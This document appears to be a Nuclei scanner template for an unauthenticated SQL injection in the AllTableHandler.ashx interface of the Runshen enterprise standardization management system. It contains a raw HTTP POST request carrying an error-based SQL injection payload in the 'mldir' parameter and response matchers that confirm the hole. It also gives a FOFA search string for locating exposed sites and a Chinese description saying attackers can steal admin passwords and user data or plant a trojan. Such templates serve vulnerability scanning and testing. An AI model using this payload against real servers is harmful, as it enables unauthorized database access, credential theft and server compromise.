http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - qkxvq1qxkzq
            - 转换成数据类型 int 时失败
        - status:
            - 500
          type: status
      matchers-condition: and
      raw:
        - |
          POST /PDCA/ashx/AllTableHandler.ashx?action=GetAll HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8

          IsOrder=4&mldir=%28SELECT+CONCAT%28CONCAT%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2C%28CASE+WHEN+%287759%3D7759%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29&zydir=&code=&status=1%2C2%2C3%2C4&page=1&rows=30
id: runshen-AllTableHandler_ashx-sql
info:
    author: Superhero
    description: |-
        fofa: body="PDCA/js/_publicCom.js"
        润申信息企业标准化管理系统 AllTableHandler.ashx 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 润申信息企业标准化管理系统 AllTableHandler.ashx SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/KpztxJiSx18XDTl7KvH_IA
    severity: high
    tags:
        - 润申信息企业标准化管理系统
